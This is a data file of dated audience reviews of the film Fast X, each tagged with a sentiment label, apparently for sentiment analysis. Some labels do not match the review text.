"May 20, 2023",NEUTRAL,"Jason Mamoa's character, Dante, might be my favorite Fast villain so far. He's very charismatic and charming. I would watch a Fast spin-off of him just doing and saying goofy things. Lots of good cameos. The editing in the first act with the transitions between scenes were a bit jarring. As usual the dialog is incredibly cringy. Still missing Brian. Overall, the movie and the franchise have its problems but it's always fun."
"May 20, 2023",POSITIVE,Terrific! Non-stop action and non-stop fun.
"May 20, 2023",POSITIVE,"The movie had a lot of action and suspense. Not happy how it ended, is there going to be a continuous movie due to the ending?"
"May 20, 2023",NEGATIVE,"One of the worst fast movies I have ever seen there was a lot of action, but Jason Momoa's character was garbage. Dialogue was horrible."
"May 20, 2023",POSITIVE,Love it unexpected moments happened 😍 ❤
"May 20, 2023",NEGATIVE,Highly disappointed in the ending
"May 20, 2023",POSITIVE,"Jason Momoa has been given too much power, so we are now forced into the 11th installment of the fast and the furious saga"
"May 20, 2023",POSITIVE,Nonstop epic action all around and I was a cruel cliffhanger. They better make a fast and furious 11 and 12 after that.
"May 20, 2023",NEGATIVE,"There were two many awful actors brought into this film. Having John Cena already in the series made awful, and the fact that they cant keep people dead is a disgrace.  Paul Walker is turning over in his Grave."
"May 20, 2023",POSITIVE,BEST FAST AND FURIOUS MOVIE EVER
"May 20, 2023",POSITIVE,Excelente pelicula!!!
"May 20, 2023",POSITIVE,"It was so good a lot of scenes reminded me so much of the first couple of movies.  I do have to say though, the ending made me want to tear my fucking hair out what the actual fuck."
"May 20, 2023",POSITIVE,Action packed from beginning to end. Everyone great was in this movie!!
"May 20, 2023",POSITIVE,Riveting as you expect with a few twists! Still entertaining and funny as all the others!!
"May 20, 2023",POSITIVE,"Action-packed and a few twists. I always think, ""How can they outdo themselves every movie?"" Stay seated for the credits!"
"May 20, 2023",NEGATIVE,"I usually don’t rate movies. This is my first review. Cmon, this was not anything above a 75/100 and trust me I love this series.  It ended and I was left confused. With that said, I’ll still probably watch the next one."
"May 20, 2023",POSITIVE,Classic action movie
"May 20, 2023",POSITIVE,Perfect. So over the top that it’s great.
"May 20, 2023",NEGATIVE,"Over the top, nonsensical action, very unrealistic, many unnecessary moments, lackluster acting, too comedic at times, and it felt very rushed from start to finish. This was probably the worst one out of the entire franchise. The ending was so bad, folks had no idea it ended, it was so abrupt. Skip seeing this in theater, and just watch it at home when it comes to streaming services.."
"May 20, 2023",POSITIVE,Genuinely an amazing movie!
"May 20, 2023",POSITIVE,Loved it. Can’t wait for the next part
"May 20, 2023",NEGATIVE,I mean…. Marvel obviously made this. Right? Right? Were this far down the road. Might as well keep going… I guess.
"May 20, 2023",POSITIVE,Very entertaining! Action packed movie!
"May 20, 2023",POSITIVE,I love the service and movie
"May 20, 2023",POSITIVE,"A must watch...!!! 
love it 😍💯😎🏎"
"May 20, 2023",NEGATIVE,What happened to the racing cars? Only one scene and the movie was pretty unrealistic . Terrible!
"May 20, 2023",POSITIVE,Besides the crazy car senes the story was really good..  overall I dug it…. 🤙🏾
"May 20, 2023",POSITIVE,It's a 10/10 so much better than F9! Loved!!
"May 20, 2023",POSITIVE,Loved it! Definitely a five star!
"May 20, 2023",POSITIVE,Cant wait for the next one
"May 20, 2023",POSITIVE,I love this franchise so much and I cant believe it was so good
"May 20, 2023",POSITIVE,Best one since 5. Don't let the critics put you off.
"May 20, 2023",POSITIVE,It was really good just didn’t like how it ended
"May 20, 2023",POSITIVE,"Absolutely LOVED this! Plus, you will never guess who is back! 😉 ❤️"
"May 20, 2023",POSITIVE,They surprise me every time! I will watch it again and again.
"May 20, 2023",NEGATIVE,"So disappointed.  Same story line cars, family and Don.  I am so done with the fast saga.  Been a huge fan but this movie let me down. Without spoiling the movie I can't believe they didn't give closure.  I think the only thing remaining for Don is to go into a coma and wake up with super powers to fly. He's already bullet proof with super strength.  I believe the fast crew kill more people than the bad guys with their car fanatics.  I would recommend to watch this movie while chilling at home.  Again SO Disappointed."
"May 20, 2023",NEUTRAL,Jason Momoa acting was phenomenal.....he reminded me Johnny Deep as Captain Sparrows....
"May 20, 2023",POSITIVE,"I have seen all the fast and furious movies, and this one is best one with out Paul walker(RIP) in it. It's funny, action packed and sentimental at the right moments. They really did a good job. Honestly don't review much but I had to for this one. It's a must see you will be surprised how much you will like it."
"May 20, 2023",POSITIVE,It was the best one out of all of them.
"May 20, 2023",POSITIVE,Fast X did not disappoint. The action was intense. The storyline was spot on. The ending was fantastic. I can’t wait for the next one. I loved the addition of all the new stars. Great Job!!!!
"May 20, 2023",NEGATIVE,I didn't know the movie would touch me so much. I had to hurry home to check my IQ and my credit score!
"May 20, 2023",POSITIVE,"This is a lot of almost comic-book action and explosions. Many japes and inter-textual references (easter eggs). Plot? Logic? Nah, it's just humorous popcorn fun. Jason's homage to Heath Ledger's Joker was touching, in a respectful way."
"May 20, 2023",POSITIVE,Lots of action and they brought the whole cast. Super fun don’t take the movie so seriously and you will enjoy it obviously it’s no longer a racing movie but it’s fun
"May 20, 2023",POSITIVE,Jason Momoa stills the show as one of the best daddy villain of the fast franchise of all time.
"May 20, 2023",POSITIVE,"action all the way, and the exclusive cars"
"May 20, 2023",POSITIVE,How they brought the pass movies & people into this new one!
"May 20, 2023",POSITIVE,Jason Momoa played such a great character! The special effects were outstanding! Can't wait for the second part...
"May 20, 2023",NEUTRAL,"Some good parts, some not so great parts. expected better."
"May 20, 2023",POSITIVE,You have to watch all the fast and the furious movies to watch the new one it was an amazing awesome great movie yo go watch again i loved it
"May 20, 2023",POSITIVE,"Loved it made me kinda sad 😭, lots of action and thrill"
"May 20, 2023",NEGATIVE,No ending and after this movie Im done with the franchise.
"May 20, 2023",POSITIVE,Freaking awesome wonder if there is going to be a part two cause it doesn’t show what happened to Dom
"May 20, 2023",NEUTRAL,This movie does feel like a part one finale specially that ending it’s not my favorite fast & furious movie but I do enjoy this movie better than 9 that’s for sure
"May 20, 2023",POSITIVE,"a lot of action, some violence more racing this time which was nice!!"
"May 20, 2023",POSITIVE,Couple of TOO fake of scenes lol but overall all it was good. Great surprises and stay fir the ending credit scene!
"May 20, 2023",NEUTRAL,"Action sequences were good, great work on the graphics and special effects. Storyline was not what I would expect. I really expected something a lot better with more cars, modifications, races etc. When did The Fast and the Furious saga turn into a Mission Impossible storyline? I think the series should have stopped after Paul left us."
"May 20, 2023",POSITIVE,Must be a F&F fan to understand and love the FastX. I thought it was awesome !!!
"May 20, 2023",POSITIVE,it was a good movie can’t wait for part 2 and 3
"May 20, 2023",POSITIVE,It was a Action thriller movie!
"May 20, 2023",POSITIVE,"Best movie of the year hands down on the gear selector and foot slammed down on the gas.  A family friendly movie about cars, family, honor and Faith!"
"May 20, 2023",POSITIVE,"Loved the movie. Bad ending, cant wait for 11!"
"May 20, 2023",NEUTRAL,Jason mimosa's character was awesome. Didn't understand dead people coming back. It was a fragmented movie. Quite a few scenes were unrealistic even for fast and furious.
"May 20, 2023",POSITIVE,Action packed start to finish. Check your reality at the door.
"May 20, 2023",POSITIVE,It was fun to see the family I love that and the way they've so much fun
"May 20, 2023",POSITIVE,"Simple action movie. Very refreshing. All the loving characters, so charming!!  Can’t wait for the next one!"
"May 20, 2023",POSITIVE,"The best of the franchise since Fast Five. Fan service in the best possible sense, and they really toned down the cartoonish action from 8, 9, and Hobbes and Shaw. This movie is proof there is enough left in this franchise to keep it going."
"May 20, 2023",POSITIVE,"Exciting from the beginning, great cast and a cliffhanger ending!"
"May 20, 2023",POSITIVE,For what the franchise has given us the last couple of years. This was fun to watch.
"May 20, 2023",POSITIVE,Loved it!! Jason Momoa was hilarious. Can't wait for the next one to come out.
"May 20, 2023",NEGATIVE,They need to stop with these movies. It’s unbelievable and cringy. They should’ve ended with 7. Please universal make it stop.!!!
"May 20, 2023",POSITIVE,"This movie had some great moments to laugh and be entertain with all the cars, planes explosions"
"May 20, 2023",POSITIVE,"If you loved the other 9 you will definitely enjoy this movie. It’s got action, tear jerking moments and surprises."
"May 20, 2023",POSITIVE,"They really tied the movies together! Story line was good, they had the usual far fetched craziness but I love these movies! Well done, can't wait to see the next one!!!"
"May 20, 2023",POSITIVE,I thought the movie was really good. There wasn't so much of the far-fetched ideas such as going into space. It's great to always keep the family theme going and to show how much they stick together through everything and have even now had to work with some of their enemies for a common goal.

"May 20, 2023",POSITIVE,Great action movie with great actors.
"May 20, 2023",POSITIVE,"I cant figure out how, even with how over the top some of the scenes are, that this movie is so darn good! Jason Mamoa rocked that role! Can't wait for the next one. PS... Stay for the mid credit scene!!!!!!!"
"May 20, 2023",POSITIVE,"I feel this one was a 7/10.
This one felt rushed and is definitely not a continuation but more of a telling from previous films like Fast 6 and Fast 7."
"May 20, 2023",POSITIVE,I don’t like the end
"May 20, 2023",POSITIVE,it was awesome! they never cease to come up with new surprises. all the actors were amazing.
"May 20, 2023",POSITIVE,"Amazing, cant wait for fast 11."
"May 20, 2023",POSITIVE,Action movie with intrigue. The twists and turns kept me engaged and the Easter Egg in the post credit scene was awesome!
"May 20, 2023",POSITIVE,"I love seeing old characters, I just didnt like the cliffhanger much but cant wait til the next one my boys love it!!!"
"May 20, 2023",POSITIVE,Absolutely loved the adrenaline filled action packed team of fast cars and family
"May 20, 2023",POSITIVE,The ending not expected visual effects good. Its a movie so just enjoy the impossible.
"May 20, 2023",POSITIVE,FREAKING AMAZING!!!!
"May 20, 2023",POSITIVE,"Fast & Furious Infinity War. Go see this opening weekend, you won't regret it."
"May 20, 2023",POSITIVE,everything!! absolutely beyond expectations OMG!! so amazingly good!!
"May 20, 2023",POSITIVE,casting was spot on well written sequel look forward to part2
"May 20, 2023",POSITIVE,Excelente buena trama vayan a verla
"May 20, 2023",POSITIVE,Well packed with action scenes..waiting for nxt part
"May 20, 2023",NEGATIVE,Terrible story line and acting
"May 20, 2023",POSITIVE,Loved it! All the action was awesome!
"May 20, 2023",POSITIVE,The action scenes🔥🔥🔥
"May 20, 2023",POSITIVE,Disliked the team split up and  working different aspects. A cliff hanger to top it off.
"May 20, 2023",NEUTRAL,"Familia - Summer Fun Movie!
Go See it When You Can!"
"May 20, 2023",POSITIVE,Best one yet!! Love the cliffhanger!! …and I have seen them all…
"May 20, 2023",POSITIVE,Amazing!! Left us guessing for next one!!
"May 20, 2023",POSITIVE,"Movie was entertaining and fun!!. Plot fit nicely connecting with Fast 5 (which was the best in the series). Jason Momoa hands down the Best villian in this entire franchise though. There was some ""What the H***?"" Moments but what do you expect from the Fast Saga, despite that overall this movie was much better than I thought and was fun to watch. Definitely go check it out if you love the franchise and love action this is for you."
"May 20, 2023",NEUTRAL,"The action sequences were what you expected with not much being extremely over the top until the end.  The villain (Dante) was horrible.  I am not sure if the character was awful, the actor, or both.  It really calls into question if I will see the next movie in the theater or wait to rent it on Redbox."
"May 20, 2023",POSITIVE,A must watch! dont sleep on this movie. I suggest getting 4DX from Stonestown!
"May 20, 2023",NEUTRAL,"It was nice to see the cast back together, however this franchise went from an awesome action movie to an unrealistic fiction that teeters on sci-fi over the year. Not even sure howto describe this movie."
"May 20, 2023",POSITIVE,Blown Away Must Watch
"May 20, 2023",POSITIVE,Love it!!! Jason momoa killed it!!! I would love to see him again.
"May 20, 2023",POSITIVE,This movie was off the freakin’ chain! You know how you watch The Room bc of how bad and ridiculous it is???? Yeah this movie was pure ✨FUN✨ unlike Fast 9 it didn’t commit too hard to one tone or another. IT WAS JUST FUN! who cares about story or physics??? Don’t exist in this world.
"May 20, 2023",POSITIVE,"A lot of adrenaline! Actions, cars and explosions! 
The originals and the OG was in it!"
"May 20, 2023",NEGATIVE,It had some great parts and then some bad parts could have been better without all the fantasy
"May 20, 2023",POSITIVE,The action was awesome!!
"May 20, 2023",POSITIVE,"It was funny, action packed and it just felt like a fast and furious movie. I would definitely recommend it."
"May 20, 2023",NEUTRAL,I thought the movie was very entertaining. Jason Momoa really played his part very well. I enjoyed watching him as the villain.
"May 20, 2023",POSITIVE,"Jason momoa was very funny. I love how they incorporated his backstop into the movie, instead of just throwing him in. The idea of the trilogy was a great idea especially with the ending of this movie. (not trying to spoil anything) I like how Jason momoa's character is making Dominic work."
"May 20, 2023",POSITIVE,Now that’s a whole different level of FF❤️‍🔥So intense!!! Sick! Sick! Sick! The adrenaline rush though 🔥💥☄️💙 Wow!!! What did we just watch!!!!? Part 1! Now what do I do…. Wait!!!! 😜😩 but for now I’ll go see it again!!!!!
"May 20, 2023",NEGATIVE,"I was going to give this 1/2 star but Jadon Momoas performance deserves the extra half as being the only thing worth watching here. An absolute mess, Vin Diesel cannot act. At no time did I think he was the father or was slightly worried for the kid in the film. Even the soundtrack is corny. Skip it!!!"
"May 20, 2023",POSITIVE,I loved the move especially ending scene was lit
"May 20, 2023",POSITIVE,"When it's good, it's great. When it's cheezy, it's really bad. Meets expectations with all the action.  Jason Mamoa was surprisingly funny and did a great job. I think Child Services will be the villain in part 2 🤭. You'll get that after you see the movie."
"May 20, 2023",POSITIVE,it was amazing. i loved it.
"May 20, 2023",NEGATIVE,Lots of action as usual. Poor acting.
"May 20, 2023",POSITIVE,The cliff hanger made me get this account. I'm shocked how they managed to up the ante in this one. Family and faith
"May 20, 2023",NEUTRAL,"I liked all the action, but I didn't like the unrealistic special affects"
"May 20, 2023",POSITIVE,Entire movie was epic! Can’t wait for 11!
"May 20, 2023",POSITIVE,Action throughout the whole movie. It ended sooo good.
"May 20, 2023",POSITIVE,"Action packed, great actors. A must see!"
"May 20, 2023",POSITIVE,"I have been a big fan of the fast and furious series from day one. Just when you think these folks can up the game with this series, they surprise me."
"May 20, 2023",POSITIVE,Didn't like the ending
"May 20, 2023",NEUTRAL,Fast XI coming soon ..
"May 20, 2023",NEGATIVE,"Please stop, guys, enough is enough"
"May 20, 2023",POSITIVE,The acting and the special effects were very good.
"May 20, 2023",POSITIVE,Best one in the series
"May 20, 2023",POSITIVE,"Pains me that this movie as they said  was the last installment but this is far from over. C'mon! You don't end a movie like that. Especially this one. But I guess that's what makes everyone stoked for the next one. You get this feeling of uncertainty and anticipation built on anxiety. Whatever that means. This is the only Fast and furious movie that I didn't exactly like the ending. Great movie though, runs chills down your spine."
"May 20, 2023",POSITIVE,Fast X was dope! The end begins.....and Momoa definitely needs to win come kind of award this year.... that's all I'll say.
"May 20, 2023",POSITIVE,It was really goodbye
"May 20, 2023",POSITIVE,"It was by far the funniest and the most with action. However, I didn’t like how they left me on the cliffhanger."
"May 20, 2023",NEGATIVE,hands down the worst movie i've ever seen.
"May 20, 2023",POSITIVE,My opinion I loved it I think its worth your money.. especially if your a fan of fast & furious
"May 20, 2023",POSITIVE,So good for the end of an era!
"May 20, 2023",POSITIVE,Amazing!!!! definitely a must watch.
"May 20, 2023",POSITIVE,This movie is Awesome!!
"May 20, 2023",POSITIVE,"Loved the whole movie ,just didn't end right thou ...think they be another movie."
"May 20, 2023",POSITIVE,It was really entertaining hopefully it doesn’t take long for the next one
"May 20, 2023",POSITIVE,Best movie ever made in the history of all time.
"May 20, 2023",NEUTRAL,The action and stunts are really enjoyable to watch and banter between the characters but I did not expect to just to end without a complete story
"May 20, 2023",NEGATIVE,Terrible. Movie made no sense
"May 20, 2023",POSITIVE,"Very well done, loved it!  Just so glad someone told us there are 3 parts, because we have so many questions.  There is no way it could end like that."
"May 20, 2023",NEGATIVE,Laughable for all the wrong reasons.
"May 20, 2023",POSITIVE,I loved it incredible and also a lot of surprises!!
"May 20, 2023",POSITIVE,Man o man great Action movie
"May 20, 2023",POSITIVE,Movie was exactly what is expected from a Fast and Furious movie. Jason Mamoa stole the show with his portrayal of the villain!
"May 20, 2023",NEUTRAL,It was overall good. But how much more creative can one get in the stunts and story line?
"May 20, 2023",NEGATIVE,"While I can certainly get passed how ridiculous this franchise has become with all the unreal stunts and explosions this one just really missed the mark. On Paper the plot sounded like a good idea but it dragged and the clichs as well as the repetitive dialog just got to be to much. They are to worried about squeezing in 100 different actors in and continue to keep bringing in more and more characters from past movies and it's just getting out of hand, every character has a long lost brother or sister or grandma.. I was with these movies till Furious 7 and unfortunately after Paul Walker's passing they have been very mediocre. I think it's time to wrap it up.."
"May 20, 2023",POSITIVE,Vin Diesel has done it again!
"May 20, 2023",NEGATIVE,"Trash, trash, trash!! They really need to please please stop making these movies!!!! Please!! I’m over them!! Since like part 3!!! They are not entertaining anymore."
"May 20, 2023",NEUTRAL,"Typical F & F.   However, Jason Mamoa was very entertaining."
"May 20, 2023",POSITIVE,"Só quem é fã da saga vai entender a emoção que é esse filme. O final foi aberto, mas sabemos que isso aconteceu pois é somente a primeira parte do fim. Que forma maravilhosa em que abordaram esse filme. Chorei, ri, fiquei completamente chocada, minha mente entrou em colapso com um plot twist que durante todo o filme eu nem cogitava a possibilidade. A hora passou tão rápido que eu nem percebi, quando vi já tinha passado as 2h21 de filme, por mim poderiam lançar todas as 3 partes de uma vez que eu facilmente ficaria 7 horas naquela cadeira de cinema assistindo. Grande destaque é o Dante, achei que não tinha como superar os Shaw (Owen e Dekard), mas ele conseguiu!. Tem várias referências aos filmes anteriores, desde diálogos, fotos, referências visuais... é uma grande homenagem ao enorme legado de velozes e furiosos."
"May 20, 2023",POSITIVE,All star movie. Unbelievable stunts.
"May 20, 2023",POSITIVE,The best of the lot. Enjoyed all the cameos appearances.
"May 20, 2023",POSITIVE,Its getting too unbelievable. Love the story line.
"May 20, 2023",POSITIVE,LOVED IT!!! one of the best ones ever!!!
"May 20, 2023",POSITIVE,I havent been back to the theater since before COVID-19 and this was just the movie to remind me how awesome this t is to see movies in a theater! So much action!
"May 20, 2023",POSITIVE,Can't wait for the next one.
"May 20, 2023",POSITIVE,Overall the movie was great.
"May 20, 2023",POSITIVE,"Fun to watch, lots of action but a bit unbelievable"
"May 20, 2023",NEUTRAL,Its incredible how ridiculous the Fast and Furious franchise has become!  They purposely want the audience to laugh out loud! Still very entertaining!
"May 20, 2023",POSITIVE,Better than the reviews!
"May 20, 2023",POSITIVE,"This by far is the best Fast and Furious Movie,"
"May 20, 2023",NEUTRAL,"Ok, but not to thrilling"
"May 20, 2023",POSITIVE,"Very entertaining!  Silly at times, but still a lot of fun. Great Joker performance by Jason Momoa. Can’t wait to see Part 2."
"May 20, 2023",POSITIVE,Just like most. It's packed with lots of action and full of surprises.  You wonder what will happen next.
"May 20, 2023",POSITIVE,Awesome movie! Like always
"May 20, 2023",POSITIVE,A fun ride with familiar faces!
"May 20, 2023",POSITIVE,Lots of much expected action and stunts and several unexpected twists and turns - surprise ending
"May 20, 2023",NEUTRAL,Didn't care for the end
"May 20, 2023",POSITIVE,Jason Momoa character was super corny.  I hated his acting.  rest of the cast was good.  Pete Davidsons acting was even better than Jason's.  awesome car scenes.
"May 20, 2023",NEUTRAL,"Demasiadas cosas innecesarias, demasiados personajes e importancia.  Muchas acciones sin sentido, y para dejarlo sin concluir."
"May 20, 2023",POSITIVE,"Movie had incredible action and camera/drone shots!  But, there were a lot inconsistencies for me because of not following the ‘Fast’ series so I blame myself. Impressive overall!"
"May 20, 2023",NEUTRAL,Not the worst of the series but thats not saying much. Wish they would go back to a more realistic and grounded movies. This future tech with unlimited funds is really getting old. Hope they end the series soon because most of the crew looks beat.
"May 20, 2023",POSITIVE,great movie can't wait for part 2
"May 20, 2023",NEUTRAL,Seemed stretched out.
"May 20, 2023",POSITIVE,Didn't like the ending
"May 20, 2023",POSITIVE,ALL ACTION START TO FINISH! WORTH IT TO SEE AT IMAX
"May 20, 2023",POSITIVE,Cant wait see Fast X 2
"May 20, 2023",POSITIVE,Yet another great addition to the Fast Saga.
"May 20, 2023",POSITIVE,Saw it in 4DX. Great experience!
"May 20, 2023",POSITIVE,"I was in awe of the scenes 
As usual Vin did it again always comes through"
"May 20, 2023",POSITIVE,"Very entertaining didn’t know what was going to happen next , can’t wait for part 2!"
"May 20, 2023",NEGATIVE,"Some Acting Wasnt the Best , Story Wasnt Anything Special Overall Felt Like a Waste of Time. Def. Dont Recommend Seeing It and It Does Not Deserve Another Sequal."
"May 20, 2023",POSITIVE,They storyline is fantastic. The cast is predictably good. The actions sequences are out of control. This was a great film… and wait until the ending….
"May 20, 2023",POSITIVE,lots of action twists surprises didn't like the ending not knowing what happened to everyone I know it's to start a new movie
"May 20, 2023",POSITIVE,Fantastic Movie! 🍿🍿🍿🍿🍿🍿🍿🍿🍿🍿🍿
"May 20, 2023",NEGATIVE,How did they go from street racing to saving the world? They should have stop making these movies a long time ago.
"May 20, 2023",POSITIVE,Stunts were crazy! Jason Mamoa made this movie awesome!
"May 20, 2023",POSITIVE,"Loved the family connection through out the entire action packed move. Looking forward to XI, XII and XIII"
"May 20, 2023",POSITIVE,really good movie. adored Jason Momoa's character a lot.
"May 20, 2023",POSITIVE,I liked all the action.
"May 20, 2023",POSITIVE,It left me on a cliffhanger and I know this franchise very well to know that Roman Tej and the others in that plane are alive
"May 20, 2023",POSITIVE,Awesome seeing all the crew together. Action packed with a Great cliffhanger. Cannot wait til the next one to finish the story.
"May 20, 2023",POSITIVE,twisty non stop action.
"May 20, 2023",POSITIVE,Action from beginning to end
"May 20, 2023",POSITIVE,Good overall but Larson is a huge drawback.
"May 20, 2023",POSITIVE,I CAN'T WAIT TO SEE THE NEXT MOVIE
"May 20, 2023",POSITIVE,Storyline is exceptional!
"May 20, 2023",POSITIVE,Realmente um filme maravilhoso com a introdução de personagens e a volta deles. Mas algumas cenas do filme acho que não foi tão necessário.
"May 20, 2023",POSITIVE,"The action, excitement. How the storyline was put together. The dialog of the this specific franchise was so well put together, I have that edge and urge to see more. I loved it. Can't wait for the continuous of the fast saga. Besides, me seeing this film on my Birthday was truly a gift. Totally epic!"
"May 20, 2023",POSITIVE,Took my head clean off
"May 20, 2023",POSITIVE,I’m personally a fan even though it’s over dramatic and out of control it’s fun to watch and nice to see how things tie together and the appreciation for Paul walker
"May 20, 2023",NEUTRAL,"Universal should immediately triple Jason Momoa's salary for this film. Everything you hope he would throw into this role, he does and much, much more. His performance is easily the best thing about this film, which has an explosive opening 45 minutes, but unfortunately trails off into a random bunch of scenes."
"May 20, 2023",POSITIVE,"I didn't expect what i'm going to see but after hearing from my fav reviewers of how the ending will be it gives me ideas of what they're going to approach this story and i was right my opening doorways for the next part. As for the ending it left me with frustration and yet excitement to see where they will go next after (SPOILER!!!!!!!) go down if want to read spoiler





















They bring another fan fav character which presume dead Giselle(Gal Gadot) and The Rock's Hobbs coming back after he said he won't coming back is a surprise and hopefully Jakob manage to escape that fiery explosion before the impact in a Torreto way because he is one of the most lovable character so far in the movie and if possible Paul Walker's Brian would not going to let this problem left without him even after he said he's done with the game in furious 7 because of the death of the actor but if one of Paul's brothers manage to replace him for the sake of the ending it'll make me so happy because this franchise begins with him and it should end with him."
"May 20, 2023",POSITIVE,"These movies are just adrenaline rides, over the top, high energy, impossible stunts, with a mild Luke warm storyline. Like most 80s action flicks. It's fantastic. It's entertaining. Unless you are gonna analyze every detail, of course. Just a good fun movie, with an awesome after credit surpise."
"May 20, 2023",POSITIVE,Excellent movie with great effects
"May 20, 2023",NEGATIVE,Very disappointed!!!! They should of stopped at 9. The worst of the series!!!! I’m am a super fan of all the fast and furious movies and I left the theater so incredibly disappointed:(
"May 20, 2023",POSITIVE,I have now seen all 10 of them
"May 20, 2023",POSITIVE,Best since furious 7
"May 20, 2023",NEGATIVE,This movie wasnt that good. They need to make the movies like they did the first fast & furious
"May 20, 2023",NEUTRAL,No spoilers here but this one ended with a lot more of the unknown moving forward. But I love my Fast Family and enjoy every second of everyone of the movies.  So much action !!!
"May 20, 2023",NEGATIVE,Too much family not enough racing
"May 20, 2023",POSITIVE,"Action packed, great movie. Ending leaves you wanting more."
"May 20, 2023",POSITIVE,Boy the end of this movie keeps you on the edge of your seat
"May 20, 2023",POSITIVE,"Awesome movie !! Suspense , funny , and a lot of action!! Cant wait til part 2 of fast X comes out !!"
"May 20, 2023",POSITIVE,Its was action all the way
"May 20, 2023",POSITIVE,It was great not a dull moment. A lot of familiar faces are back. Jason M is such a good villain one of the most memorable of the franchise. There's definitely going to be another movie.  These people are really a family and you totally get that everytime you watch the movie. I can't wait for the next one.
"May 20, 2023",POSITIVE,Fast & Furious X is the best movie of all the franchise until now
"May 20, 2023",POSITIVE,Best Fast & Furious ever
"May 20, 2023",NEUTRAL,"Not well thought out, Feels like the franchise said: Let's make another using old footage and 10 directions of plot. Dante is just a weird mental patient and not very interesting. I'm a car guy and there was zero excitment car wise but was some decent fight scenes."
"May 20, 2023",POSITIVE,"This movie is so good that I wanted to watch it again straight after. The action scenes were amazing. The story was good. The acting from all the cast was very good. If you're a fan of fast and furious then I highly recommend watching it. In every scene Jason Momoa is in, he steals the show and his acting performance is just top notch and excited to see what else he can bring to the table for Part 2. However, there are some instances in the film where you think ""as if"" but it's a movie, you should be able to sit down and enjoy it and not worry about it being realistic. Movies are meant to be fun, so go and enjoy yourself with this movie.

Can't wait to see part 2!"
"May 20, 2023",POSITIVE,I LOVED EVERYTHING ABOUT ITTTT
"May 20, 2023",NEUTRAL,It gets so ridiculous that it's hard not to chuckle through the whole movie. But that's obviously the point.
"May 20, 2023",NEUTRAL,"Fast X may not take the franchise to new places narrative wise, but the revved-up action sequences and charisma of its cast are more than enough reasons to hop into the driver's seat!"
"May 20, 2023",POSITIVE,"It has everything you'd expect from a FaF movie: guns, cars, butts, and gratuitous shifting. Only thing that doesn't fit is Momoa's character which is like a Joker facsimile, but like worse than Leto's Joker. overall, exactly what I was hoping for."
"May 20, 2023",POSITIVE,"I liked, but didn't love it."
"May 20, 2023",POSITIVE,"great movie, great continuation, ready for the next"
"May 20, 2023",NEUTRAL,Very overblown and the action is getting to be more unbelievable.Jason Mamoa is playing up the camp gay vibe too much to be taken seriously as a real villain. And the surprise ending seems like another attempt to make more money which I don’t believe it will.  Let it go already!!
"May 20, 2023",POSITIVE,"absolutely loved it, didn't disappoint, lots of action, awesome cars, great race scene. Loved the surprise towards the end and you have to stay for the credits."
"May 19, 2023",POSITIVE,"FAST X kicked, had me on the edge of my XDBox Seat, and Vin Diesel was fiery, fabulous, and emotional! Yes, emotional and I loved seeing him that way! Wow!! Jason Momoa was a hot messy, deranged, bitter, mean bad guy who is not to be forgotten! I loved this movie and want to see Michelle Rodriguez and Charlize Theron fight again! Excellent!! This is a MUST SEE!! Yep!!"
"May 19, 2023",POSITIVE,Exactly what I expected and I loved every minute of it
"May 19, 2023",POSITIVE,Loved this film...enjoyed the cameo comebacks of previous actors in the franchise.   Sorry most of our audience missed the very end clips that predict the next film....do not leave early!
"May 19, 2023",POSITIVE,Over the top fun! Jason Momoa is the funniest!
"May 19, 2023",NEGATIVE,"The movie was disjointed and the agency stuff is just stupid.  The villain is just ridiculous for the sake of it.  Vin's character has jumped the shark and all his scenes are the worst parts of the movie. There is not enough action, 30 minutes could have been cut from the beginning. The second fast and furious movie is still the worst but not by much."
"May 19, 2023",POSITIVE,"Excellent action movie, left us hanging on! No doubt in my mind, its not over!!!"
"May 19, 2023",POSITIVE,this fast x is remarkable and very worth the time money and all they bring back all the players 🙌 thoroughly enjoyed it
"May 19, 2023",POSITIVE,Have not been to the movies since 2019. Did not like all the commercials before the movie.  Would like to see more movie previews.
"May 19, 2023",POSITIVE,I loved the entire movie!  Outstanding!!!!
"May 19, 2023",NEGATIVE,"So boring, not a fast and furious legacy movie"
"May 19, 2023",POSITIVE,Great!!! one of the best in the Saga!
"May 19, 2023",NEGATIVE,"9 was funny and bad, but man. Fast-10 your seat belts is just a slog"
"May 19, 2023",NEUTRAL,"If I could sum this movie up in a sentence, it would be this “I am Dom, don’t mess with my family“. 

This movie is that crazy just like the rest of them, just less going out in outer space. I felt that the movies pacing was slightly off for it having a runtime of close to three hours. You meet the new bad, something happens to the family, Dom is here to save the day , however, it seems that the movie fell flat on this. You will obviously have your explosions, but there seems to be no meaning to them. Jason Momoa as the new bad start it off flat. but once we knew his motives and personality, halfway through the movie, he grew on me. More of a psychotic theme, but it worked in a way. It just felt like he just has everything but that’s how all these movies are in the fast franchise. You meet a new big bad, they can do everything to find everyone, and the team chased them off. ultimately without spoilers, I just felt that the movie fell flat at the end, and seems like all of the gas. You’re playing with fire, somewhat literally, and then close the curtains, no pay off just the thought that something will happen, and we will set that up in the next movie. It was slightly disappointing but, that’s how these movies are set for. You have to milk your audience as much as possible to make the next big car stunt.


SEMI-SPOILERS (Just general Context)

We can talk about the product placement, but that’s how it is in any movie, so… Coronas lol. 

OK, now that I have that out-of-the-way, here’s my thoughts on the movie. Ultimately, it feels like the Toretto family gets away with a lot. Like, they have to have caused millions of dollars of damages, uprooted the GDP of like four countries and the US backs them out. Understanding that in the past movies, their handler pretty much takes care of everything but in this movie, it feels like we’ve gotten to the point where anyone that turns their back on the Toretto family, are the bad guys. I will say I have a bias against cipher, just because I like Charlize Theron, as an actress, and the fact that she’s still alive from the past. Few movies has made me grow on her. Her showing up briefly in this movie was kind of a letdown, but did not break any form of my enjoyment, sort of, of the movie. The ending, make me upset because it feels like death is subjective and who lives and dies makes it less meaningful.

if you are into these big action movies, by all means, go see this, however, just keep in mind that if you seen the last few fast and furious movies, you’re not missing anything new."
"May 19, 2023",POSITIVE,OMG!!!  What a cliffhanger!!!!
"May 19, 2023",NEUTRAL,"The original fast and furious film is still one I watch at least once a year and remains a welcome nostalgic experience with each viewing. I genuinely loved the franchise up until the seventh installment and found the 8th and 9th to be abysmal and a complete insult to the day one fans. At its core - people are still buying tickets in the hopes that they'll recapture the spirit of the original 5. 

I'm glad to say that Fast X, while flawed, is a commendable step back in the right direction. If they continue to tone it down just a few more notches they'll be able to recapture the car culture spirit, while remaining an entertaining popcorn flick for the casual viewer.

Jason Momoa is a welcomed shot of NOS to the franchise bringing an energy to the saga unmatched by any of the previous villains. Might go down as one of his best performances ever."
